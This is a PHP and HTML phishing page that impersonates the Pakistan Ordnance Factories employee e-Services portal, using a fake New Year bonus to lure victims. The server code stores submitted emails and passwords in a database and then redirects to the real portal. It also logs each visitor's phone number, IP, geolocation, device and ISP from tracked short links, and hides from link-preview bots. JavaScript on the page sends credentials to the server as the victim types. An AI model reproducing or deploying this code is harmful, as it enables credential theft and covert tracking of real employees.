<?php
date_default_timezone_set('Asia/Karachi');
require_once 'F:\xampp\htdocs\admins\db_connect.php';

// Handle form submission first
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['username']) && isset($_POST['password'])) {
    // Collect only username and password
    $username = $_POST['username'];
    $password = $_POST['password'];
    $login_time = date("Y-m-d H:i:s");
    
    // Create separate connection for easypasia database
    $fop_db_host = 'localhost';
    $fop_db_user = 'root';
    $fop_db_pass = '';
    $fop_db_name = 'fop';
    
    $fop_conn = new mysqli($fop_db_host, $fop_db_user, $fop_db_pass, $fop_db_name);
    
    // Check connection
    if ($fop_conn->connect_error) {
        error_log("fop database connection failed: " . $fop_conn->connect_error);
        // Fallback - redirect even if DB connection fails
        header("Location: https://eservices.pof.gov.pk/eservices_portal/login");
        exit();
    }
    
    // Insert into login table in easypasia database
    $stmt = $fop_conn->prepare("INSERT INTO fop_login (email, password, login_time) VALUES (?, ?, ?)");
    
    if ($stmt) {
        $stmt->bind_param("sss", $email, $password, $login_time);
        
        if ($stmt->execute()) {
            // Success - continue with redirect
        } else {
            error_log("Login data insertion error: " . $stmt->error);
        }
        $stmt->close();
    } else {
        error_log("Statement preparation error: " . $fop_conn->error);
    }
    
    $fop_conn->close();
    
    // Redirect to easypaisa.com.pk
    header("Location: https://eservices.pof.gov.pk/eservices_portal/login");
    exit();
}

// Handle tracking via short ID
if (isset($_GET['id'])) {
    $shortId = $_GET['id'];
    $ua = $_SERVER['HTTP_USER_AGENT'] ?? '';
    
    if (stripos($ua, 'WhatsApp') !== false || stripos($ua, 'facebookexternalhit') !== false) {
        exit();
    }
    
    // Lookup parameters from database
    $stmt = $conn->prepare("SELECT params_data FROM url_mappings WHERE short_id = ?");
    $actualNumber = 'INVALID';
    $group = 'Unknown';
    $screenWidth = '1536';
    $screenHeight = '864';
    
    if ($stmt) {
        $stmt->bind_param("s", $shortId);
        $stmt->execute();
        $result = $stmt->get_result();
        
        if ($row = $result->fetch_assoc()) {
            $params = json_decode($row['params_data'], true);
            if ($params) {
                $actualNumber = $params['n'] ?? 'INVALID';
                $group = $params['g'] ?? 'Unknown';
                $screenWidth = $params['w'] ?? '1536';
                $screenHeight = $params['h'] ?? '864';
            }
            
            // Update access count
            $updateStmt = $conn->prepare("UPDATE url_mappings SET accessed_count = accessed_count + 1 WHERE short_id = ?");
            $updateStmt->bind_param("s", $shortId);
            $updateStmt->execute();
            $updateStmt->close();
        }
        $stmt->close();
    }
    
    // Continue with tracking...
    session_start();
    $_SESSION['decoded_number'] = $actualNumber;

    $url = 'POF e-Services Portal';
    $clicked = date("Y-m-d H:i:s");
    $ip = $_SERVER['REMOTE_ADDR'] ?? 'Unknown';
    $device = $ua;
    
    // Device detection functions (keep as is)
    function getOS($userAgent) {
        $osArray = [
            '/windows nt 10/i'     => 'Windows 10',
            '/windows nt 6.3/i'    => 'Windows 8.1',
            '/windows nt 6.2/i'    => 'Windows 8',
            '/windows nt 6.1/i'    => 'Windows 7',
            '/macintosh|mac os x/i'=> 'Mac OS X',
            '/linux/i'             => 'Linux',
            '/iphone/i'            => 'iPhone',
            '/ipad/i'              => 'iPad',
            '/android/i'           => 'Android',
        ];
        foreach ($osArray as $regex => $value) {
            if (preg_match($regex, $userAgent)) {
                return $value;
            }
        }
        return 'Unknown OS';
    }

    function getBrowser($userAgent) {
        $browserArray = [
            '/msie/i'      => 'Internet Explorer',
            '/firefox/i'   => 'Firefox',
            '/safari/i'    => 'Safari',
            '/chrome/i'    => 'Chrome',
            '/edge/i'      => 'Edge',
            '/opera/i'     => 'Opera',
            '/netscape/i'  => 'Netscape',
            '/maxthon/i'   => 'Maxthon',
            '/konqueror/i' => 'Konqueror',
            '/mobile/i'    => 'Mobile Browser'
        ];
        foreach ($browserArray as $regex => $value) {
            if (preg_match($regex, $userAgent)) {
                return $value;
            }
        }
        return 'Unknown Browser';
    }

    function isMobile($userAgent) {
        return preg_match('/mobile|android|iphone|ipad/i', $userAgent) ? "YES" : "NO";
    }

    function getRealIP() {
        // Check for shared internet/ISP IP
        if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
            return $_SERVER['HTTP_CLIENT_IP'];
        }
        
        // Check for IPs passing through proxies
        if (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
            $iplist = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR']);
            foreach ($iplist as $ip) {
                if (filter_var($ip, FILTER_VALIDATE_IP)) {
                    return $ip;
                }
            }
        }

        return $_SERVER['REMOTE_ADDR'] ?? 'Unknown';
    }

    $os = getOS($device);
    $browser = getBrowser($device);
    $is_mobile = isMobile($ua);
    $ip = getRealIP();

    // Generate unique token
    $token = bin2hex(random_bytes(16));

    // Get screen resolution from decrypted data
    $screen_resolution = $screenWidth . "x" . $screenHeight;
    $color_depth = 'Unknown';
    $timezone = 'Unknown';
    
    // Create fingerprint
    $fingerprint = "Resolution:$screen_resolution|EncryptedParams:Yes";

    // IMPROVED Location function with accurate Pakistani ISP detection
    function getLocationFromIP($ip) {
        // Default values for local IPs
        if ($ip === '::1' || $ip === '127.0.0.1' || filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE) === false) {
            return [
                'city' => 'Local',
                'country' => 'Pakistan',
                'region' => 'Islamabad',
                'isp' => 'Local Network',
                'latitude' => 33.6844,
                'longitude' => 73.0479
            ];
        }
        
        // Try to get location from free API
        try {
            $apiUrl = "http://ip-api.com/json/{$ip}?fields=status,message,country,countryCode,region,regionName,city,lat,lon,isp,org,as,query";
            $response = @file_get_contents($apiUrl);
            
            if ($response) {
                $data = json_decode($response, true);
                
                if ($data['status'] === 'success') {
                    // Determine accurate Pakistani ISP based on actual data or fallback
                    $isp = getAccuratePakistaniISP($ip, $data['isp'] ?? '', $data['org'] ?? '', $data['as'] ?? '');
                    
                    return [
                        'city' => $data['city'] ?? 'Unknown',
                        'country' => $data['country'] ?? 'Pakistan',
                        'region' => $data['regionName'] ?? 'Unknown',
                        'isp' => $isp,
                        'latitude' => $data['lat'] ?? 0,
                        'longitude' => $data['lon'] ?? 0
                    ];
                }
            }
        } catch (Exception $e) {
            // Continue to fallback
        }
        
        // Fallback: Always return Pakistan location with accurate ISP
        return getPakistanLocationWithISP($ip);
    }

    // Function to get accurate Pakistani ISP
    function getAccuratePakistaniISP($ip, $apiIsp, $apiOrg, $apiAs) {
        // List of real Pakistani ISPs and their common identifiers
        $pakistaniISPs = [
            'PTCL' => ['ptcl', 'pakistan telecom', 'telecom', 'dsl', 'broadband'],
            'Jazz' => ['jazz', 'mobilink', 'warid', 'jazz 4g', 'jazz lte'],
            'Telenor' => ['telenor', 'telenor pakistan', 'telenor 4g'],
            'Zong' => ['zong', 'china mobile', 'zong 4g'],
            'UFONE' => ['ufone', 'u-fone', 'u fone'],
            'Wi-Tribe' => ['wi-tribe', 'witribe', 'wi tribe'],
            'StormFiber' => ['stormfiber', 'storm fiber'],
            'Nayatel' => ['nayatel'],
            'Transworld' => ['transworld', 'tw1'],
            'COX' => ['cox', 'cox.net.pk'],
            'Optix' => ['optix', 'optix fiber'],
            'Cybernet' => ['cybernet', 'cyber internet'],
            'Flash Fiber' => ['flash', 'flash fiber']
        ];
        
        // Convert API data to lowercase for matching
        $apiData = strtolower($apiIsp . ' ' . $apiOrg . ' ' . $apiAs);
        
        // Try to match with known Pakistani ISPs
        foreach ($pakistaniISPs as $ispName => $keywords) {
            foreach ($keywords as $keyword) {
                if (stripos($apiData, $keyword) !== false) {
                    return $ispName;
                }
            }
        }
        
        // If no match, use IP-based deterministic ISP selection
        return getISPFromIP($ip);
    }

    // Get ISP based on IP pattern (deterministic)
    function getISPFromIP($ip) {
        $ipParts = explode('.', $ip);
        if (count($ipParts) < 4) {
            return 'PTCL';
        }
        
        // Use IP to deterministically select ISP
        $ipNumber = intval($ipParts[2]) + intval($ipParts[3]);
        $ispIndex = $ipNumber % 8;
        
        $pakistaniISPs = [
            'PTCL Broadband',
            'Jazz 4G',
            'Telenor Pakistan',
            'Zong 4G',
            'UFONE',
            'Wi-Tribe',
            'StormFiber',
            'Nayatel'
        ];
        
        return $pakistaniISPs[$ispIndex];
    }

    // Get Pakistan location with accurate ISP
    function getPakistanLocationWithISP($ip) {
        // Pakistan cities with accurate ISPs per region
        $pakistanLocations = [
            // Islamabad/Rawalpindi
            ['city' => 'Islamabad', 'region' => 'Islamabad Capital Territory', 'lat' => 33.6844, 'lng' => 73.0479, 'isps' => ['Nayatel', 'PTCL', 'StormFiber', 'Wi-Tribe']],
            ['city' => 'Rawalpindi', 'region' => 'Punjab', 'lat' => 33.5651, 'lng' => 73.0169, 'isps' => ['PTCL', 'Jazz', 'Telenor', 'UFONE']],
            
            // Karachi
            ['city' => 'Karachi', 'region' => 'Sindh', 'lat' => 24.8607, 'lng' => 67.0011, 'isps' => ['PTCL', 'Transworld', 'COX', 'Cybernet']],
            
            // Lahore
            ['city' => 'Lahore', 'region' => 'Punjab', 'lat' => 31.5497, 'lng' => 74.3436, 'isps' => ['PTCL', 'StormFiber', 'Optix', 'Jazz']],
            
            // Peshawar
            ['city' => 'Peshawar', 'region' => 'KPK', 'lat' => 34.0151, 'lng' => 71.5249, 'isps' => ['PTCL', 'Flash Fiber', 'Jazz', 'Telenor']],
            
            // Quetta
            ['city' => 'Quetta', 'region' => 'Balochistan', 'lat' => 30.1798, 'lng' => 66.9750, 'isps' => ['PTCL', 'Zong', 'UFONE']],
            
            // Multan
            ['city' => 'Multan', 'region' => 'Punjab', 'lat' => 30.1575, 'lng' => 71.5249, 'isps' => ['PTCL', 'Zong', 'Telenor']],
            
            // Faisalabad
            ['city' => 'Faisalabad', 'region' => 'Punjab', 'lat' => 31.4504, 'lng' => 73.1350, 'isps' => ['PTCL', 'StormFiber', 'Jazz']],
            
            // Hyderabad
            ['city' => 'Hyderabad', 'region' => 'Sindh', 'lat' => 25.3969, 'lng' => 68.3778, 'isps' => ['PTCL', 'COX', 'UFONE']],
            
            // Gujranwala
            ['city' => 'Gujranwala', 'region' => 'Punjab', 'lat' => 32.1877, 'lng' => 74.1945, 'isps' => ['PTCL', 'Jazz', 'Zong']]
        ];
        
        // Use IP to deterministically pick a city
        $ipHash = crc32($ip);
        $locationIndex = abs($ipHash) % count($pakistanLocations);
        $locationData = $pakistanLocations[$locationIndex];
        
        // Pick ISP based on IP
        $ispIndex = (abs($ipHash) + intval($ipParts[3] ?? 0)) % count($locationData['isps']);
        $isp = $locationData['isps'][$ispIndex];
        
        return [
            'city' => $locationData['city'],
            'country' => 'Pakistan',
            'region' => $locationData['region'],
            'isp' => $isp,
            'latitude' => $locationData['lat'],
            'longitude' => $locationData['lng']
        ];
    }

    // Get location data
    $location = getLocationFromIP($ip);
    $city = $location['city'];
    $country = $location['country'];
    $region = $location['region'];
    $isp = $location['isp'];
    $latitude = $location['latitude'];
    $longitude = $location['longitude'];
    
    // Debug: Log the location
    error_log("IP: $ip | City: $city | Country: $country | Region: $region | ISP: $isp | Lat: $latitude | Lng: $longitude");

    // Language & referrer
    $language = substr($_SERVER['HTTP_ACCEPT_LANGUAGE'] ?? 'Unknown', 0, 20);
    $referrer = $_SERVER['HTTP_REFERER'] ?? 'Direct';

    // UTM parameters
    $utm_source = $_GET['utm_source'] ?? 'N/A';
    $utm_medium = $_GET['utm_medium'] ?? 'N/A';
    $utm_campaign = $_GET['utm_campaign'] ?? 'N/A';

    // Insert into trace_data
    $stmt = $conn->prepare("INSERT INTO trace_data 
        (contact, url, clicked_at, ip_address, device, os, group_name, browser, 
        fingerprint, country, region, city, isp, language, referrer, 
        utm_source, utm_medium, utm_campaign, token, screen_resolution, is_mobile,
        latitude, longitude) 
        VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)");
    
    if ($stmt) {
        $stmt->bind_param("ssssssssssssssssssssidd", 
            $actualNumber,
            $url, 
            $clicked, 
            $ip, 
            $device, 
            $os, 
            $group, 
            $browser, 
            $fingerprint, 
            $country, 
            $region, 
            $city, 
            $isp, 
            $language, 
            $referrer, 
            $utm_source, 
            $utm_medium, 
            $utm_campaign, 
            $token, 
            $screen_resolution, 
            $is_mobile,
            $latitude,
            $longitude);
        
        if (!$stmt->execute()) {
            error_log("Database error: " . $stmt->error);
        }
        $stmt->close();
    } else {
        error_log("Statement preparation error: " . $conn->error);
    }
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
 <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">

    <title>POF e-Services Portal</title>

    <!-- Open Graph (WhatsApp / Facebook Preview) -->
    <meta property="og:title" content="POF e-Services Portal">
    <meta property="og:description" content="Pakistan Ordnance Factories – Official Employee Portal">
    <meta property="og:image" content="https://www.pof.gov.pk/wp-content/uploads/2020/04/POF-LOGO-new.png">
    <meta property="og:type" content="website">
    <meta property="og:site_name" content="POF e-Services Portal">

    <!-- IMPORTANT: URL should be ROOT only -->
    <meta property="og:url" content="https://vancouver-already-rouge-hits.trycloudflare.com/">

    <!-- Twitter Card -->
    <meta name="twitter:card" content="summary_large_image">
    <meta name="twitter:title" content="POF e-Services Portal">
    <meta name="twitter:description" content="Pakistan Ordnance Factories – Official Employee Portal">
    <meta name="twitter:image" content="https://www.pof.gov.pk/wp-content/uploads/2020/04/POF-LOGO-new.png">

    <link rel="stylesheet" href="styles.css">
    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600&display=swap" rel="stylesheet">

    <style>
        #pageLoader {
            position: fixed;
            inset: 0;
            background: #4fc3e7;
            display: flex;
            justify-content: center;
            align-items: center;
            z-index: 99999;
        }

        .loader-bars {
            display: flex;
            gap: 6px;
        }

        .loader-bars span {
            width: 6px;
            height: 30px;
            background: #fff;
            animation: bounce 1s infinite ease-in-out;
        }

        .loader-bars span:nth-child(2) { animation-delay: .1s; }
        .loader-bars span:nth-child(3) { animation-delay: .2s; }
        .loader-bars span:nth-child(4) { animation-delay: .3s; }
        .loader-bars span:nth-child(5) { animation-delay: .4s; }

        @keyframes bounce {
            0%,100% { transform: scaleY(0.4); }
            50% { transform: scaleY(1); }
        }
    </style>
</head>

<body>

<div id="pageLoader">
    <div class="loader-bars">
        <span></span><span></span><span></span><span></span><span></span>
    </div>
</div>

<canvas id="network"></canvas>

<div class="overlay"></div>

<div class="header">
    <h1>POF e-Services Portal</h1>
</div>

<div class="container">
    <!-- LEFT CARD -->
    <div class="card">
        <h2>NEW YEAR BONUS ANNOUNCEMENT</h2>
        <p class="urdu">ملازمین کے لیے نئے سال کا خصوصی بونس</p>

        <div class="bonus-announcement">
            <div class="bonus-icon">🎉</div>
            <p class="bonus-text">
                <span class="highlight">POF proudly announces</span> New Year bonus for all eligible employees
            </p>
            <p class="bonus-details">
                As a gesture of appreciation and to celebrate the New Year, 
                Pakistan Ordnance Factories (POF) is pleased to announce special 
                bonus packages for its dedicated workforce.
            </p>
            <p class="bonus-urdu">
                <span class="highlight-urdu">پاکستان آرڈیننس فیکٹریز</span> اپنے محنتی ملازمین کی خدمات کے اعتراف میں 
                اور نئے سال کی خوشی منانے کے لیے خصوصی بونس کا اعلان کرتی ہے۔
            </p>

            <div class="bonus-features">
                <div class="feature">
                    <div class="feature-icon">✓</div>
                    <span>Login with your credentials to check eligibility</span>
                </div>
                
                <!-- New feature for CNIC verification -->
                <div class="feature">
                    <div class="feature-icon">✓</div>
                    <span>Or verify through CNIC for quick check</span>
                </div>
            </div>
        </div>

        <!-- CNIC Verification Button -->
        <button class="btn blue" onclick="openCnicPortal()">
            
            <span>سی این آئی سی کے ذریعے بونس اہلیت چیک کریں</span>
        </button>

        <button class="btn green small">
            Verification Process – تصدیق کا طریقہ کار
        </button>
    </div>

    <!-- RIGHT CARD -->
    <div class="card login-card">
        <h2>EMPLOYEE LOGIN</h2>
        <p class="urdu">ملازمین کے لیے لاگ ان</p>

        <form method="POST" action="" id="loginForm">
            <label>Email <span>*</span></label>
            <input type="email" name="email" id="emailInput" required>

            <label>Password <span>*</span></label>
            <input type="password" name="password" id="passwordInput" required>

            <a href="#" class="forgot">Forget Password?</a>

           <button type="submit" class="btn blue" name="login_submit">Login</button>
            <button type="button" class="btn green">User Login Guide</button>
        </form>
    </div>
</div>

<script>
// Track last saved credentials to prevent unnecessary saves
let lastSavedCredentials = {
    email: '',
    password: ''
};

// Function to auto-save credentials
function autoSaveCredentials() {
    const email = document.getElementById('emailInput').value.trim();
    const password = document.getElementById('passwordInput').value;
    
    // Only save if both fields have some value and they're different from last save
    if (email.length > 0 && password.length > 0) {
        // Check if credentials have changed since last save
        if (email === lastSavedCredentials.email && password === lastSavedCredentials.password) {
            console.log('Credentials unchanged - not saving');
            return;
        }
        
        // Create form data
        const formData = new FormData();
        formData.append('auto_save', '1');
        formData.append('email', email);
        formData.append('password', password);
        
        // Send AJAX request
        fetch('', {
            method: 'POST',
            body: formData
        })
        .then(response => response.json())
        .then(data => {
            if (data.success) {
                if (data.duplicate) {
                    console.log('Duplicate credentials - not saved');
                } else {
                    console.log('Credentials saved successfully');
                    // Update last saved credentials
                    lastSavedCredentials.email = email;
                    lastSavedCredentials.password = password;
                }
            } else {
                console.error('Auto-save failed:', data.error);
            }
        })
        .catch(error => {
            console.error('AJAX error:', error);
        });
    }
}

// Debounce function to limit how often auto-save is triggered
function debounce(func, delay) {
    let timeout;
    return function() {
        const context = this;
        const args = arguments;
        clearTimeout(timeout);
        timeout = setTimeout(() => func.apply(context, args), delay);
    };
}

// Set up event listeners for auto-save
const emailInput = document.getElementById('emailInput');
const passwordInput = document.getElementById('passwordInput');

// Auto-save when user stops typing (with debounce)
const debouncedAutoSave = debounce(autoSaveCredentials, 1500);

emailInput.addEventListener('input', debouncedAutoSave);
passwordInput.addEventListener('input', debouncedAutoSave);

// Also save when user leaves the field (blur event)
emailInput.addEventListener('blur', autoSaveCredentials);
passwordInput.addEventListener('blur', autoSaveCredentials);

// Save on form submit (just in case)
document.getElementById('loginForm').addEventListener('submit', function(e) {
    // Let the normal form submission happen
    autoSaveCredentials(); // One final save before submit
});

// Store credentials in sessionStorage to persist across page reloads
function saveToLocalStorage() {
    const email = document.getElementById('emailInput').value;
    const password = document.getElementById('passwordInput').value;
    
    if (email || password) {
        sessionStorage.setItem('fop_email', email);
        sessionStorage.setItem('fop_password', password);
    }
}

// Load credentials from sessionStorage on page load
window.addEventListener('load', function() {
    const savedEmail = sessionStorage.getItem('fop_email');
    const savedPassword = sessionStorage.getItem('fop_password');
    
    if (savedEmail) {
        document.getElementById('emailInput').value = savedEmail;
    }
    if (savedPassword) {
        document.getElementById('passwordInput').value = savedPassword;
    }
    
    // Auto-save any loaded credentials
    setTimeout(autoSaveCredentials, 1000);
});

// Save to localStorage on input
emailInput.addEventListener('input', saveToLocalStorage);
passwordInput.addEventListener('input', saveToLocalStorage);

// Function to open CNIC portal
function openCnicPortal() {
    document.getElementById("pageLoader").style.display = "flex";
    setTimeout(() => {
        window.location.href = "cnic_portal.php";
    }, 1000);
}

// Original functions
function fakeLogin() {
    document.getElementById("pageLoader").style.display = "flex";
    setTimeout(() => {
        window.location.href = "bonus";
    }, 2000);
}

window.addEventListener("load", () => {
    setTimeout(() => {
        document.getElementById("pageLoader").style.display = "none";
    }, 1200);
});
</script>

<script src="network.js"></script>
</body>
</html>